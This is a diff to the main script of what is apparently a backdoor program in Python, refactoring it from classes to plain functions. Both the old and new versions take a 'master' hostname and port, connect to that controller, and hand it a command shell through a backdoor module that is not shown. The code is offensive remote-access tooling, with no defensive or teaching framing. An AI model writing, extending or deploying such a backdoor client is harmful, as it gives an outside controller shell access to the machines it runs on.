@@ -1,21 +1,14 @@
-#!/bin/usr/python3
+from lib.connection import *
+from lib.args import *
+from lib.backdoor import *
 
-from lib.connection import Connection
-from lib.cli import CLI
-from lib.backdoor import Backdoor
-from lib.crypto import Crypto
 
 def main():
-    cli = CLI()
-    crypto = Crypto()
-
-    connection = Connection(cli.master_hostname, cli.master_port)
-    conn = connection.connect_master()
-
-    backdoor = Backdoor(connection.conn, cli.master_hostname, cli.master_port, crypto)
-    backdoor.cmd_shell()
-
+    master_hostname, master_port = get_args()
+    conn = connect_master(master_hostname, master_port)
+    cmd_shell(conn, master_hostname, master_port)
     return 0
+
 
 if __name__ == "__main__":
     main()
